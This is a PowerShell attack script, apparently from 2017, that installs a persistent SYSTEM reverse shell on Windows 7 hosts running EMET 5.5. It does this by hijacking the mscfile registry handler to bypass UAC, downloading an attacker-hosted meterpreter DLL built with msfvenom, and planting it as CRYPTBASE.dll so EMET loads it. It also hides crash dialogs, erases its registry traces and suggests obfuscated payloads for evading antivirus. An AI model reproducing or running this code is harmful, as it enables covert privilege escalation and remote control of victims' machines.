<#
EMET 5.5 (CRYPTBASE.dll) - Persistent SYSTEM Shell Implant (Win7)

Author: Fabrizio Siciliano (https://www.twitter.com/0rbz_)
Date: 5/6/2017

Context: similar to the Intel PROSet Wireless implant: http://x42.obscurechannel.com/?p=378

Requirements: 
1. You have a previously acquired shell (through some other exploit) on a machine as a local admin user, and UAC is set to anything other than "Always Notify".

2. A dll payload:
  - msfvenom -p windows/x86/meterpreter/reverse_https -f dll LHOST=attacker_ip LPORT=443 > CRYPTBASE.dll
  
3. A place to host your "CRYPTBASE.dll" payload that supports HTTPS (helps with AV heuristics).

4. Generate a proper meterpreter https listener resource file, with a custom SSL cert (AV's love custom 
   meterpreter certs): http://bit.ly/2odN6OV

Some bits of this code borrowed from @enigma0x3 (some UAC stuff...)

Takes a url to your "CRYPTBASE.dll" payload as an argument:

powershell.exe ./EMET_Implant.ps1 https://yourserver/CRYPTBASE.dll

WARNING: This will break EMET, but will persist across reboots as a SYSTEM shell.
#> 

param (   
    [string]$PsPayload = $(throw "--------------------------------------------------------------------------
** Usage:                                                               **
** powershell.exe ./EMET_Implant.ps1 https://yourserver/CRYPTBASE.dll **
--------------------------------------------------------------------------")
)
	# Check that EMET.dll is in its usual location. Should confirm that EMET is installed. 
	$EmetExists = "C:\Program Files (x86)\EMET 5.5\EMET.dll"
	if(![System.IO.File]::Exists($EmetExists)){
	Echo "
[!] It doesn't look like EMET is installed on this system. Couldn't find 'EMET.dll'. Quitting."
	exit
	}
	$EmetExists = "C:\Program Files (x86)\EMET 5.5\EMET.dll"
	if([System.IO.File]::Exists($EmetExists)){
	Echo "
[*] Found EMET! Make sure your listener is running."
	Start-Sleep -s 3
	Echo "[+] Checking UAC status."
	Start-Sleep -s 5
	}
	$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "[!] UAC is set to 'Always Notify', I can't help you."
        exit
		}		
    else{
		Echo "[*] UAC Status OK and set to 'Default'."
		Start-Sleep -s 3
		Echo "[+] Setting up persistent implant and executing payload."

		$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
		$ValName = "(Default)"
		$LocalFile = "C:\Program Files (x86)\EMET 5.5\CRYPTBASE.dll"
		$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadFile('$PsPayload','$LocalFile')"
		
		New-Item -Path $MscRegPath -Force | Out-Null
		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
		
		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
		$a_cmd = "C:\windows\system32\cmd.exe"
		&$a_cmd = $CompMgmtBypass
		
		Start-Sleep -s 5
		
		# don't display APPCRASH error when we call EMET_Service.exe
		$MscRegPath = "HKCU:\Software\Microsoft\Windows\Windows Error Reporting"
		$ValName = "DontShowUI"
		$RegValue = "1"
		
		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
		$a_cmd = "C:\windows\system32\cmd.exe"
		&$a_cmd = $CompMgmtBypass
		
		New-Item -Path $MscRegPath -Force | Out-Null
		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
		
		Start-Sleep -s 5
		
		$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
		$ValName = "(Default)"
		$RegValue = "C:\Program Files (x86)\EMET 5.5\EMET_Service.exe"
		
		New-Item -Path $MscRegPath -Force | Out-Null
		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
		
		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
		$a_cmd = "C:\windows\system32\cmd.exe"
		&$a_cmd = $CompMgmtBypass
		
		Start-Sleep -s 5
		
		# Cleanup registry modifications
		$MscRegCleanup = "HKCU:\Software\Classes\mscfile"
		Remove-Item -Path $MscRegCleanup -Force  -Recurse -ErrorAction SilentlyContinue | Out-Null
		
		# Check that our implant is in its final location
		$Implant = "C:\Program Files (x86)\EMET 5.5\CRYPTBASE.dll"
		if([System.IO.File]::Exists($Implant)){
			Echo "[*] Done! 'CRYPTBASE.dll' implant successful. Check your shell, run 'getsystem'."
			Echo "[*] Will persist across reboots and phone home as a SYSTEM shell before user login."
			Start-Sleep -s 3
			Echo '
[*] To uninstall:
	- del "C:\Program Files (x86)\EMET 5.5\CRYPTBASE.DLL"'
		exit
		}
			else{
				Echo "[!] Something went horribly wrong and the implant was not installed. Possibly flagged by AV? Try an obfuscated payload."
			}
			exit
	}
